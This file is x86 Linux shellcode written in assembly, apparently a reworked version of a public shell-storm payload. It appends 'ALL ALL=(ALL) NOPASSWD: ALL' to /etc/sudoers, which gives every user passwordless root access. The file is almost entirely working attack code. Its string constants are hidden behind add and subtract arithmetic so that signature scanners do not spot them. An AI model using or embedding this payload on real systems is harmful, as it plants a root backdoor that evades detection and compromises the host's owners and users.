; Linux/x86 - edit /etc/sudoers for full access - 128 bytes
; http://shell-storm.org/shellcode/files/shellcode-62.php
; Original author: Rick
; New author: John

section .text
	global _start

_start:

	;open("/etc/sudoers", O_WRONLY | O_APPEND);
	xor eax, eax
	push eax
	;push 0x7372656f		; "sreo"
	push 0x85a6bbe7
	sub dword [esp], 0x12345678
	;push 0x6475732f		; "dus/"
	mov eax, 0x4d3d1d1f
	add eax, 0x17385610
	push eax
	;push 0x6374652f			; "cte/"
	mov dword [esp-4], 0x6374652f
	sub esp, 4
	cld
	mov ebx, esp
	;mov cx, 0x401
	sub eax, 0x64756f2e
	mov ecx, eax							; ecx = flag values
	;mov al, 0x05
	push byte 0x5
	pop eax							; eax = open() syscall
	int 0x80


	xchg ebx, eax			; ebx = file descriptor

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
	xor edx, edx
	push edx

	;push 0x0a4c4c41		; "\nLLA"
	mov eax, 0x1f605f53
	sub eax, 0x15141312
	push eax		; "\nLLA"

	;push 0x203a4457         ; " :DW"
	add eax, 0x15edf816
	push eax		; " :DW"

	;push 0x53534150		; "SSAP"
	add eax, 0x3318fcf9
	push eax		; "SSAP"

	;push 0x4f4e2029		; "ON )"
	add eax, 0xfbfaded9
	push eax		; "LLA("

	;push 0x4c4c4128		; "LLA("
	sub eax, 0x0301df01
	push eax		; "=LLA"

	;push 0x3d4c4c41		; "=LLA"
	sub eax, 0x0efff4e7
	push eax

	;push 0x204c4c41		; " LLA"
	;add eax, 0xe2ffffff
	;add eax, 1
	;push eax		; " LLA"
	mov eax, 0x0d1ad910
	add eax, 0x13317331
	push eax


	mov ecx, esp			; ecx points to "ALL ALL=(ALL) NOPASSWD: ALL\n"
	;mov dl, 0x1c
	push byte 0x1c
	pop edx				; edx = 28
	;mov al, 0x04
	push byte 0x4
	pop eax				; eax = 4 = syscall write()
	int 0x80					; syscall

	;close(file)			; ebx still = file descriptor
	mov al, 0x06			; eax = close() syscall
	int 0x80

	;exit(0);
	xor ebx, ebx
	mov al, 0x01
	int 0x80
